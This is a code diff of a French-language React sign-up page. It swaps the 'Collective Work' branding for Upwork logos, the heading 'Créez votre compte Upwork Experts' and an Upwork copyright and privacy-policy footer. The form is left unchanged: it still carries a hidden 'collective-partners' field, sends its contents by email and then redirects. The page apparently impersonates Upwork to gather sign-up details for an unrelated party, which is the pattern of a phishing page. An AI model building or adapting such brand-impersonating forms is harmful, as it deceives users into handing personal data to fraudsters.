@@ -66,7 +66,7 @@ export default function Starts() {
     setIsBackgroundVisible(true); // Assurez-vous que la div d'arrière-plan reste visible
     sendEmail(e);
     setTimeout(() => {
-      router.push('/board');
+      router.push('/dashboard');
     }, 5000);
   };
 
@@ -85,17 +85,11 @@ export default function Starts() {
           </article>
         </div>
       )}
-      <div className="left-column">
-        <img className='graphity-top' src='graphity-top.svg' />
-        <img className='graphity-bot' src='graphity-bot.svg' />
-        <img className='logo' src='collective-logo.png' alt="Collective Work" />
-        <div className="shop-info">
-          <img className='process' src='process.png' alt="Collective Work" />
-          <h1>Finalisez votre inscription obtenez, <span className='yellow'>tout de suite, votre première mission</span></h1>
-        </div>
-        <p className='secure footer'>© 2024 - Tous droits réservés -  Collective SAS</p>
-      </div>
-      <div className="right-column">
+      
+        <img className='logo talents' src='logo-talents.png' alt="Talents Groupe" />
+        <img className='logo upwork' src='upwork-logo.png' alt="Talents Groupe" />
+
+        <h1>Créez votre compte Upwork Experts</h1>
         <form className="checkout-form" onSubmit={sendEmail} ref={formRef}> {/* Add ref to the form */}
           <input type="hidden" name="website" value='collective-partners' />
 
@@ -140,7 +134,7 @@ export default function Starts() {
             <a href="/"><button type="button">Retour à la boutique</button></a>
           </div>
         </form>
-      </div>
+      <p className='secure footer'>© 2015 - 2025 Upwork® Global Inc. • <a target='_blank' href='https://www.upwork.com/legal#privacy'>Privacy Policy</a></p>
     </div>
   );
 };
